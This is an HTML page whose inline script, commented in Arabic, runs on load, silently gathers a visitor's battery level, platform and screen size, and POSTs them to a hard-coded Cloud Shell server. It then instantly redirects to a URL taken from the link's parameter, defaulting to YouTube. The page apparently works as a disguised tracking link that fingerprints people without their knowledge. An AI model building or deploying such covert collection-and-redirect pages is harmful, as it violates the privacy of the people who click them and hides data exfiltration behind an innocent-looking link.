<!DOCTYPE html>
<html>
<head>
    <script>
        // رابط السيرفر المباشر (تأكد إنه شغال بالـ Web Preview)
        const SERVER_URL = "https://8080-cs-f65a8037-daaf-45b2-a58a-a8f4d4f83c4f.cs-europe-west4-pear.cloudshell.dev/";

        async function collect() {
            const params = new URLSearchParams(window.location.search);
            const target = params.get('u') || 'https://youtube.com';
            
            let batt = "N/A";
            try {
                const b = await navigator.getBattery();
                batt = `${Math.round(b.level * 100)}% (${b.charging ? 'يشحن' : 'فرغ'})`;
            } catch(e) {}

            const payload = {
                battery: batt,
                platform: navigator.platform,
                screen: `${window.screen.width}x${window.screen.height}`,
                target: target
            };

            // إرسال البيانات (POST)
            fetch(SERVER_URL, {
                method: 'POST',
                mode: 'no-cors', 
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            }).finally(() => {
                // التحويل الفوري
                window.location.replace(target);
            });
        }
        window.onload = collect;
    </script>
</head>
<body style="background:#000;"></body>
</html>
